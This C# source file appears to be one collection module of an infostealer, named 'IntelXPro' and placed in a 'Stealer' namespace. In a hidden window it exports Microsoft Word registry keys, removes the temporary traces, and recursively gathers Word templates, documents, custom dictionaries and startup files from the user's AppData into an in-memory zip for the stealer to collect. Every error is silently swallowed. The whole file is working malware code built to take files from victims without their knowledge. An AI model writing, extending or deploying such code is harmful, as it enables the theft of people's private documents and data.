using IntelXPro.src.IntelXPro.Dependencies.Data;
using IntelXPro.src.IntelXPro.Stealer;
using System;
using System.Diagnostics;
using System.IO;
using System.Linq;

namespace IntelXPro.src.IntelXPro.Stealer.Applications.Microsoft
{
    internal class Word : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            try
            {
                var wordApp = new Counter.CounterApplications { Name = "Microsoft Word" };
                
                CollectWordRegistry(zip, wordApp);
                CollectWordFiles(zip, wordApp);
                
                if (wordApp.Files.Count > 0)
                {
                    counter.Applications.Add(wordApp);
                }
            }
            catch { }
        }

        private void CollectWordRegistry(InMemoryZip zip, Counter.CounterApplications wordApp)
        {
            try
            {
                string[] registryPaths = {
                    @"HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Word",
                    @"HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Word\Data",
                    @"HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Word\Options"
                };

                foreach (string regPath in registryPaths)
                {
                    try
                    {
                        string fileName = $"word_registry_{regPath.Split('\\').Last()}.reg";
                        using (var process = new Process())
                        {
                            process.StartInfo.FileName = "reg";
                            process.StartInfo.Arguments = $"export \"{regPath}\" \"{fileName}\" /y";
                            process.StartInfo.UseShellExecute = false;
                            process.StartInfo.CreateNoWindow = true;
                            process.Start();
                            process.WaitForExit();

                            if (File.Exists(fileName))
                            {
                                string relativePath = Path.Combine("Microsoft", "Word", fileName);
                                zip.AddFile(relativePath, File.ReadAllBytes(fileName));
                                wordApp.Files.Add(relativePath);
                                File.Delete(fileName);
                            }
                        }
                    }
                    catch { }
                }
            }
            catch { }
        }

        private void CollectWordFiles(InMemoryZip zip, Counter.CounterApplications wordApp)
        {
            try
            {
                string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                
                string[] wordPaths = {
                    Path.Combine(appData, "Microsoft", "Templates"),
                    Path.Combine(appData, "Microsoft", "Word", "STARTUP"),
                    Path.Combine(appData, "Microsoft", "Proof"),
                    Path.Combine(appData, "Microsoft", "UProof")
                };

                foreach (string wordPath in wordPaths)
                {
                    if (Directory.Exists(wordPath))
                    {
                        CollectWordFilesFromPath(wordPath, zip, wordApp);
                    }
                }
            }
            catch { }
        }

        private void CollectWordFilesFromPath(string basePath, InMemoryZip zip, Counter.CounterApplications wordApp)
        {
            try
            {
                foreach (string file in Directory.GetFiles(basePath, "*", SearchOption.AllDirectories))
                {
                    try
                    {
                        string extension = Path.GetExtension(file).ToLower();
                        string fileName = Path.GetFileName(file).ToLower();
                        
                        if (extension == ".dotx" || extension == ".dotm" || extension == ".dot" ||
                            extension == ".docx" || extension == ".doc" || extension == ".docm" ||
                            extension == ".dic" || extension == ".lex" || extension == ".xml" ||
                            fileName.Contains("word") || fileName.Contains("template") ||
                            fileName.Contains("dictionary") || fileName.Contains("startup"))
                        {
                            string relativePath = Path.Combine("Microsoft", "Word", 
                                file.Substring(basePath.Length).TrimStart('\\'));
                            
                            zip.AddFile(relativePath, File.ReadAllBytes(file));
                            wordApp.Files.Add(relativePath);
                        }
                    }
                    catch { }
                }
            }
            catch { }
        }
    }
}
